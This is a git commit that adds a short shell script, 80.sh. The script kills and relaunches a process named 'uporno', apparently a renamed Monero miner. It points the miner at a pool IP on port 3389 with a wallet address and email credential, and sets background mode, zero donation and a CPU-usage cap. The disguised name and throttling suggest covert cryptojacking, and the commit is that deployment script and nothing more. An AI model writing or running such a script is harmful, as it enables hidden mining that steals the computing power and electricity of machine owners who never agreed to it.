3e5257c159f95726aa2b13617eb24a68bc013dc7
geroinovi4 <49794302+geroinovi4@users.noreply.github.com>
2019-04-25 14:41:23 +0300

    Add files via upload

---
+++ 80.sh
@@ -0,0 +1,3 @@
+pkill uporno
+sleep 7
+uporno -o 31.131.29.136:3389 -u 88WpGa13MLGCdjnL3dd56eGHHoY8C1Qtg8RsEy3ZWrve2Hgkm1nGVfzUjjp1HXRqiDSwyectutLHU7GSsXpvHhqzGpwAXxR --pass=geroinov1@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=43 --av=1 --variant -1
